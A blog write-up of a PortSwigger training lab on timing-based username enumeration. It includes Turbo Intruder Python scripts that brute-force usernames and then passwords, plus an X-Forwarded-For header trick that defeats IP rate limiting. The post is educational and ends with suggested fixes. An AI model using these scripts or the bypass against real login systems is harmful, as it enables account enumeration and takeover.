---
layout: post
title: "PortSwigger Lab: Username enumeration via response timing"
date: 2025-08-01
categories: ["PortSwigger", "Authentication Vulnerabilities"]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in password-based login"
  - "Username Enumeration"
  - "Brute Force"
  - "Turbo Intruder"
  - "Burp Suite"
---

# PortSwigger Lab: Username Enumeration via Response Timing

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [What's the login info?](#main-question)
  - [Solution Steps](#solution)
- [Key Takeaways](#key-takeaways)
- [What I'd Do Next](#what-id-do-next)

# Overview / Goal

"This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page."

So again, same mission: **find the correct login credentials**.

Wordlists provided by PortSwigger:

- https://portswigger.net/web-security/authentication/auth-lab-usernames
- https://portswigger.net/web-security/authentication/auth-lab-passwords

My given credentials to test with: `wiener:peter`

The first lab in this category was username enumeration based on the response **Length**, the second one was about based on response **Text**, this one is about response **Timing**.

Before going into the lab I could guess that I'll have to brute-force the Username wordlist with an EXTREMELY long static password to see which username gives the slowest response time. Based on that I'll be able to tell which exists right?

# Lab Setup and Tools

- Burp Suite + Firefox (through FoxyProxy)
- Turbo Intruder extension

# What's the Login Info? {#main-question}

## Solution Steps {#solution}

**1) Initial Timing Tests**

So, just like every lab in this category, I started by inputting a fake username and password `FAKE:FAKE` and sent the Request.

I took the `POST /login` request and sent it to Repeater to start testing.

For this clearly invalid username, I got the response time **157 millis**.

Alright, so, lets test a VERY LONG fake password with the fake username. I tried

```http
FAKE:FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKE
```

And that took **79 millis**.

Okay, now I tried the real given creds `wiener:peter` and that took **76 millis**.

Time to try the real username with the VERY LONG fake password. I tried

```http
wiener:FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKE
```

And that took **540 millis** 😁

So, obviously when a username is correct, the server checks the password and a long password can take a long response time. So sure, the site can normalise the response length and make sure there aren't any typos or differences in the text. But if it takes time that is weirdly long compared to an incorrect username, then it still lets us enumerate usernames

**2) Turbo Intruder Time!**

So, knowing all that, time to test ALL the usernames given in the wordlist with the comically long password.

For this step, I whipped out Turbo Intruder again to solve the lab faster. I clicked the request from Repeater and sent it to my extension Turbo Intruder. There, I selected the username as the payload for the wordlist, and left the password as the very long one. The selection was done by doing

```http
username=%s&password=FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKE
```

I used this script below:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
    for x in range(10, 20):
        engine.queue(target.req, x)
    for word in open('/home/meow/un'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    table.add(req)
```

And oh... I've been rate blocked 🥲…

I got the error **"You have made too many incorrect login attempts. Please try again in 30 minute(s)."**

LUCKILY this lab is vulnerable to simple little HTTP header trick called `X-Forwarded-For`.

> "With **header manipulation**, hackers tamper with HTTP headers like `X-Forwarded-For` or `Referer` to make requests look like they're from different sources. If your rate limit trusts these headers, attackers can fake them to appear as new users or devices, bypassing restrictions. It's a low-effort trick that exploits systems that don't double-check header data."
>
> iHa089. (2023). _How hackers bypass rate limits_. iHa089 Security Blog. https://iha089.org/how-hackers-bypass-rate-limits/

So, `X-Forwarded-For` can be used to bypass the rate block. For example, if I make a request with `X-Forwarded-For: 1` a few times, I'll get rate blocked again. But! If I make `X-Forwarded-For` change number to `2`, then `3`, then `4` and so on for every few attempts. I'll never get rate blocked!

Except I choose to be lazy and just made it increase by "+1" for every attempt.

**3) Bypassing Rate Limits**

So, I went back and modified the script to have the request:

```http
X-Forwarded-For: %s
username=%s&password=FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKE
```

And I made a Python script for Turbo Intruder that uses an incrementing number for the first word (Here it would be the `X-Forwarded-For`) while keeping the second word from the wordlist (the usernames in the given wordlist)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    counter = 1
    for secondWord in open('/home/meow/un'):
        engine.queue(target.req, [str(counter), secondWord.rstrip()])
        counter += 1
def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

All the usernames were quick enough except one. And that would be `puppet` in my case.

> Fun Fact: The lab answers change every time so your answers won't be mine.

**Username:** `puppet` ✅

**4) Password Brute-force**

I modified the script to brute only the password now instead of the username, while keeping the name `puppet`:

```http
X-Forwarded-For: %s
username=puppet&password=%s
```

After I ran the script I got "Status 302" on the password `ginger`

**Password:** `ginger` ✅

Well, time to try logging in with `puppet:ginger`

And it worked! Lab solved 😁

**Answer:** `puppet:ginger` ✅

---

# Key Takeaways

Timing attacks are sneaky! Even when you think you've secured everything by normalizing error messages and response lengths, the time it takes to process requests can still leak information.

The server was taking longer for valid usernames because it was actually processing the password hash comparison, while for invalid usernames it could return immediately.

# What I'd Do Next

To fix this vulnerability, I'd make sure the server takes exactly the same amount of time for every login attempt, regardless of whether the username exists or not. Maybe I could:

- Add artificial delays to match the worst-case processing time.
- Maybe process dummy password hashes for non-existent users?
- Implement proper rate limiting that can't be bypassed with simple header tricks!
